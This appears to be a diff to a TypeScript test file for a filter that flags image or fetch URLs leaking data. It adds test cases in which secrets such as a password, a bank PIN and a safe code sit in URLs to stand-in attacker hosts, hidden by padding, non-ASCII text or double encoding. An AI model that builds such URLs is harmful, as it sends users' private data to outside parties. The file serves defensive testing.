@@ -24,6 +24,10 @@ const noiseHex = (bytes: number, seed: number) => noise(bytes, seed).map((byte) 
 const noiseB64 = (bytes: number, seed: number) => btoa(String.fromCharCode(...noise(bytes, seed)));
 const noiseB64url = (bytes: number, seed: number) => noiseB64(bytes, seed).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
 const chunks = (text: string, size: number) => text.match(new RegExp(`.{1,${size}}`, "g")) ?? [];
+const BASE62 = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+const base62 = (length: number, seed: number) => noise(length, seed).map((byte) => BASE62[byte % 62]).join("");
+/** Random CJK ideographs: about 14 bits each. */
+const cjk = (length: number, seed: number) => noise(length * 2, seed).reduce((text, byte, i, bytes) => (i % 2 ? text + String.fromCharCode(0x4e00 + ((bytes[i - 1]! << 8) | byte) % 0x5000) : text), "");
 
 const UUID_A = "4f8a2c1d-7b3e-4a6f-9c2d-1e5f8a7b3c4d";
 const UUID_B = "9a8b7c6d-5e4f-4a3b-8c2d-1e0f9a8b7c6d";
@@ -521,6 +525,33 @@ const MUST_ASK: Record<string, string[]> = {
     `https://evil.s3.amazonaws.com/a.png?${SIGV4.replace("host", b64url(SECRET).toLowerCase())}&X-Amz-Signature=${noiseHex(32, 96)}`,
     `https://d111111abcdef8.cloudfront.net/a.png?Expires=1767225600&Signature=${b64url(SECRET.repeat(5)).slice(0, 344)}&Key-Pair-Id=K2JCJMDEHXQW5F`,
     `https://evil.blob.core.windows.net/a/b.png?sv=2023-11-03&se=2026-11-18T12%3A00%3A00Z&sr=b&sp=r&sig=${encodeURIComponent(b64("the pin is 4321 and code is 9911").slice(0, 44))}`,
+  ],
+  // The failing examples of the security review at 1ec65d90 (REPORT-v6), and variants of them: each loaded there.
+  "review v6, F1: bytes around an address inside the address": [
+    `https://e.example/x?u=${base62(20000, 111)}https://wikipedia.org/a.png`,
+    `https://e.example/x?u=https://wikipedia.org/a.png%23${base62(20000, 112)}`,
+    `https://e.example/x?u=https://wikipedia.org/${base62(20000, 113)}/../a.png`,
+    `https://e.example/x?u=https://wikipedia.org/${base62(200, 114)}/%252e%252e/a.png`,
+    `https://e.example/x?u=https%3A%2F%2Fwikipedia.org%2Fa.png%23${base62(60, 115)}`,
+    `https://e.example/fetch/x${base62(40, 116)}https://wikipedia.org/a.png`,
+    `https://e.example/x?u=${b64(`${String.fromCharCode(...noise(60, 117).map((byte) => byte | 0x80))}https://wikipedia.org/a.png`)}`,
+  ],
+  "review v6, F2: characters outside ASCII": [
+    `https://e.example/${base62(298, 121)}é`,
+    `https://e.example/${base62(590, 122)}é`,
+    `https://e.example/${cjk(299, 123)}`,
+    `https://e.example/${cjk(599, 124)}`,
+    `https://e.example/${encodeURIComponent(cjk(140, 125))}.png`,
+    "https://attacker.example/thepasswordishunter2andherbankpinis4471andthesafecodeis9921é.png",
+    "https://attacker.example/парольотпочтыхантердваибанковскийпинчетыречетыресемьодинкодотсейфадевятьдевятьдваодин.png",
+    `https://e.example/a.png?v=${base62(60, 126)}é`,
+  ],
+  "review v6, F3: bytes under a second layer of encoding": [
+    // Bytes that are not text (0x80-0xBF), each written %25XX.
+    `https://e.example/${noise(280, 131).map((byte) => `%25${(0x80 | (byte & 0x3f)).toString(16).toUpperCase()}`).join("")}`,
+    `https://e.example/${noise(590, 132).map((byte) => `%25${(0x80 | (byte & 0x3f)).toString(16).toUpperCase()}`).join("")}`,
+    `https://e.example/a.png?d=${noise(64, 133).map((byte) => `%25${(0x80 | (byte & 0x3f)).toString(16)}`).join("")}`,
+    "https://e.example/photos/Annual%2520report%2520draft%2520do%2520not%2520share.jpg",
   ],
 };
 
